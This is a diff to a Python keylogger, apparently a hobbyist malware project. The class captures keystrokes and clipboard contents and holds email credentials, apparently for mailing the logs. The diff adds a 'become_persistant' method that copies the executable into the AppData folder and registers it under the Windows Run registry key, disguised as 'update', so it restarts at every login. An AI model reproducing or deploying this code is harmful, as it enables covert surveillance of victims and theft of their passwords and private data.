@@ -4,9 +4,10 @@ import pynput.keyboard
 import threading
 import smtplib
 import pyperclip
-import time
-
-
+import os
+import shutil
+import subprocess
+import sys
 
 class Keylogger:
 
@@ -15,9 +16,16 @@ class Keylogger:
         self.interval = time_interval
         self.email = email
         self.password = password
+        self.become_persistant()
 
     def append_log(self, string):
         self.log = self.log + string
+
+    def become_persistant(self):
+        location = os.environ["appdata"] + "\\Keylogger.exe"
+        if not os.path.exists(location):
+            shutil.copyfile(sys.executable, location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"', shell = True)
 
     def process_key_press(self, key):
         try:
